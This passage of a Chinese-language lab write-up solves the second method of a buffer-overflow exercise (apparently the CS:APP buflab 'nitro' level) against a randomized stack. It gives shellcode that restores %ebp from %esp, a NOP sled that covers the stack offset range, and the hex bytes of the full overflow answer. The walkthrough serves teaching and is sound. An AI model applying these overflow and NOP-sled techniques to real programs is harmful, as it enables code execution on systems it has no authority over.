...
## level4方法二
第一种方法是抓住了作者设计的漏洞，依靠伪随机特性记录下每次的寄存器和栈帧。  
但这毕竟不是作者本意，如果他能注意到这一点，并把时间或PID等作为random()的参数的话，方法一就失效了。  
下面我们假设不知道下一次的栈帧如何，在这种情况下解题。  
有两个问题待解决:  
1. 既然栈是随机的，我们该如何还原%ebp  
还原`%ebp`，不一定要在520 ~ 523的位置填原`%ebp`的地址，我们还可以在攻击代码中写下还原`%ebp`的操作。  
因为栈是随机的，我们不能填确定的地址，但是我们可以根据`%esp`与`%ebp`的相对地址来还原`%ebp`。  
根据上面的图片，`%ebp`与`原%ebp`差了`0x30`。  
而运行到攻击代码时，`%esp`已经执行了一次`leave`操作和一次`ret`操作，相当于在`%ebp`的基础上加`0x8`。  
那么得到`原%ebp`与此时的`%esp`相差`0x28`，攻击代码如下:  
```assembly
00000000 <_start>:
   0:   b8 ef b4 da 17          mov    $0x17dab4ef,%eax
   ...
   e:   c3                      ret    
```
2. 既然栈是随机的，我们该如何控制跳转地址让我们的攻击代码每次都能执行  
虽说是随机化栈，但每次随机化栈帧的偏移量是在一定范围内的，这个范围是[-240,240]。  
getbufn()函数的缓冲区大小为520，比这个范围要大，那么我们可以把跳转位置设置到缓冲区中间的位置。  
设置完后，剩余的部分用`nop`指令填充，`nop`指令除了让ip+1以外没有别的作用。  
这样缓冲区的`nop`指令就能覆盖偏移量的整个范围，从而让攻击代码每次都能执行。  
答案如下:  
```
...
......
90 90 90 90 90 90 90 90
90 b8 ef b4 da 17 8d 6c
24 28 68 e2 8c 04 08 c3
08 35 68 55                 /* 524 ~ 527 跳转 */
/* 循环五次，下面四次的答案都和上面的一样 */
```
![VALID4-2](./image/VALID4-2.png)